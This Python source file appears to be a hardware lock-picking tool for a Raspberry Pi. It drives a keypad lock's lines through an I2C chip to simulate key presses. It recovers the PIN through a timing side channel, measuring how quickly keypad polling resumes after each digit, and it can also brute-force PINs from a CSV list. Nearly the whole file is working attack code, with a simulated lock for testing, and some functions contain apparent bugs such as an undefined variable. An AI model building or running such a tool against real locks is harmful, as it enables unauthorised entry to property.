
import smbus
import time
import csv
from display import Display

class Lockpick:
    #timeout can't be found by polling the lock
    def __init__(self, lock_type="polling", password_length=4, timeout=3.5,correct_timeout = 3.0, discover_timings=True,hardware = True):
        self.lock_type = lock_type
        self.password_length = password_length
        self.timeout = timeout
        self.keypad_keys = [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"], ["*", "0", "#"]]
        self.rows = len(self.keypad_keys)
        self.columns = len(self.keypad_keys[0])

        self.column_bytes = [0b11110011, 0b11110101, 0b11111001]
        self.row_bytes = [0b11100001, 0b11010001, 0b10110001, 0b01110001, 0b11110001, 1]
        self.key_vectors = [(0,0),(0,1),(0,2),(1,0),(1,1),(1,2),(2,0),(2,1),(2,2),(3,0),(3,1),(3,2)]
        self.hardware = hardware
        self.correct_timeout = correct_timeout

        #The default of the i2c chip is to set all pins to high.
        #To not poll all the columns directly we call the unpress function
        if hardware:
            self.display = Display()
            self.i2c = smbus.SMBus(1)
            self.i2c.write_byte(0x38, 0xFF)
            self.unpress()
        else:
            self.generate_test_variables()
        print("insert cable")
        #time.sleep(10)
        self.calculate_timings(discover_timings)



    def generate_test_variables(self):
        self.attempt = ""
        self.password = "0000"

    def update_attempt(self,row,column):
        self.attempt += self.keypad_keys[row][column]
        correct_content = self.password.startswith(self.attempt)
        correct_length = len(self.password) == len(self.attempt)

        if correct_length and correct_content:
            self.attempt = ""
            print("correct pin and length", self.attempt)
            return 2.9
        elif correct_content:
            print("Correct pin", self.attempt)
            return .15
        else:
            print("Wrong pin", self.attempt)
            self.attempt = ""
            return .8
    def update_brute_force_attempt(self,row,column):
        self.attempt += self.keypad_keys[row][column]
        correct_content = self.password.startswith(self.attempt)
        correct_length = len(self.password) == len(self.attempt)

        if correct_length and correct_content:
            self.attempt = ""
            print("correct pin and length", self.attempt)
            return 2.9
        elif correct_length and not correct_content:
            print("Wrong pin", self.attempt)
            self.attempt = ""
            return .8
        else:
            return .15


    #press

    #Description:
        #pulls down a column based on parameter
    #Parameters:
        #column: integer - the column to be pulled down (0-2)

    def press(self, column):
        self.i2c.write_byte(0x38, self.column_bytes[column])


    #unpress

    #Description:
        #Sets the i2c chip to the default state of not pulling down columns and reading on other pins

    def unpress(self):
        self.i2c.write_byte(0x38, 0b11110001)


    #wait

    #Description:
        #Halts execution until a specified row or all rows are being polled
    #Parameters:
        #val: integer - the row to be waited for (4 for all rows)

    def wait(self, row, change=False):

        if change:
            value = self.row_bytes.index(self.i2c.read_byte(0x38))
            last_value = None
            while not ((last_value == (row-1)%4) and (value == row)):
                last_value = value
                value =self.row_bytes.index(self.i2c.read_byte(0x38))

#        if change:
#            value = self.i2c.read_byte(0x38)
#            while self.i2c.read_byte(0x38) == self.row_bytes[val]:
#        		pass

        else:
        	value = self.i2c.read_byte(0x38)
        	while self.i2c.read_byte(0x38) != self.row_bytes[val]:
        		pass


    #press_key()

    #Description:
        #Simulates a key press for interrupt or polling lock
    #Parameters:
        #row: integer - row of key being pressed
    	#column: integer - column of key being pressed
    	#return_time: Boolean - if response to key press should be timed
    #Returns:
    	#time taken to reactivate keypad after keypress (optional return)

    def press_key(self, row, column, return_time=False):
        if not self.hardware:
            timing = self.update_brute_force_attempt(row,column)
            time.sleep(timing)
            return timing if return_time else None

        if self.lock_type != "polling":
            self.press(column)
            time.sleep(0.01)
            self.unpress()


        self.wait(row, True)
        self.press(column)

        self.display.show(self.keypad_keys[row][column])
        if return_time:
            t0 = time.time()
        time.sleep(0.01)
        self.unpress()
        row = 4
        while (row == 4) or (row == 5):
            row = self.row_bytes.index(self.i2c.read_byte(0x38))

        if return_time:
            print(time.time() - t0)
            return time.time() - t0


    #calculate_timings

    #Description:
        #Analyzes the delta time between key polls
        #We assume that one key will be the correct key, thus one key will have a significantly shorter deltaT
        #We remove the correct deltaT and average the rest of the wrong deltaTs in order to calculate the threshold.
        #The threshold is used thoughout the class to determine if a key press is the correct.
    #Parameters:
        #automatic: Boolean

    def calculate_timings(self, automatic):
        if automatic:
            timings = []
            for row in range(self.rows):
                for column in range(self.columns):
                    timings.append(self.press_key(row, column, True))
                    time.sleep(1)
            print(timings)
            correct_time = min(timings)
            timings.remove(max(timings)) #allows code to work in case calculate_timings finds password
            incorrect_time = max(timings)
            self.threshold_low = (correct_time + incorrect_time) / 2
            self.threshold_high = (self.correct_timeout + incorrect_time) / 2
            print("correct time", correct_time)
            print("incorrect time", incorrect_time)
            print("threshold", self.threshold_low,self.threshold_high)
        else:
            self.threshold_low = .5
            self.threshold_high = 1.5


    def get_password(self):
        password = []
        password_string = ""
        input_known_password = False
        for digit in range(self.password_length):
            print("Finding digit ", digit)
            for key in self.key_vectors:
                if input_known_password:
                    for i in password:
                        print("Inserting known key ", i,self.keypad_keys[i[0]][i[1]])
                        self.press_key(i[0],  i[1])
                        time.sleep(1)
                print("Trying key ", key,self.keypad_keys[key[0]][key[1]])
                key_timing = self.press_key(key[0], key[1], True)
                if  key_timing < self.threshold_low or key_timing > self.threshold_high:
                    print("Adding key to password ",key,self.keypad_keys[key[0]][key[1]])
                    password.append(key)
                    password_string += self.keypad_keys[key[0]][key[1]]
                    input_known_password = False
                    #Because the right key was found the next iteration of the loop should not
                    #Input all the correct keys again, as this will add them
                    break
                input_known_password = True
                time.sleep(1)

        return password_string

    def test(self):
        val1 = self.i2c.read_byte(0x38)
        x = time.time()
        while True:
            val2 = val1
            val1 = self.i2c.read_byte(0x38)

            if val1 != val2:
                if (time.time()-x):
                    print(val1)
                    print(time.time()-x)
                x = time.time()

    def test2(self, val):
        x= time.time()


        press(val)
        time.sleep(0.005)
        val1 = self.i2c.read_byte(0x38)
        while (time.time() - x) < 1:
            val2 = val1
            val1 = self.i2c.read_byte(0x38)
            if val1 != val2:
                print(val1)





    def check_rows(self):
        while True:
            row = self.row_bytes.index(self.i2c.read_byte(0x38))
            print("row value", row)

    def press_columns(self):
        for column in range(self.columns):
            print("stage 1",column)
            self.press(column)
            t0 = time.time()
            print("stage 6: start measuring time",t0)
            print("stage 2: pressed")
            time.sleep(0.01)
            print("stage 3: waited .005")
            self.unpress()
            print("stage 5: unpressed")
            row = 4
            print(time.time()-t0)
            while (row == 4) or (row == 5):
                row = self.row_bytes.index(self.i2c.read_byte(0x38))
                #print("stage 4: read row", row)
            print("exit while")



            print(time.time()-t0)
            print("stage 7: wating for new poll")
            self.wait(row, True)
            print("stage 8: poll has started")
            print(time.time()-t0)
            t1 = time.time()
            print("stage 9: measure new t1", t1)
            dt = t1-t0
            print(t0,t1,dt,column,row,self.keypad_keys[row][column])

            time.sleep(1)


    def brute_force(self):
        map = {"1": (0, 0), "2": (0, 1), "3": (0, 2), "4": (1, 0), "5": (1, 1), "6": (1, 2), "7": (2, 0), "8": (2, 1), "9": (2, 2), "*": (3, 0), "0": (3, 1), "#": (3, 2)}
        file = open("test_order.csv")
        reader = csv.reader(file)
        print(self.threshold_high)
        test_order = reader.__next__()
        for pin in test_order:
            count = 0
            print(pin)
            for digit in pin:
                time.sleep(1)
                count += 1
                if count == self.password_length:
                    if self.press_key(map[digit][0], map[digit][1], True) > self.threshold_high:
                        return pin
                    time.sleep(3)
                    print(len(pin))
                else:
                    self.press_key(map[digit][0], map[digit][1])
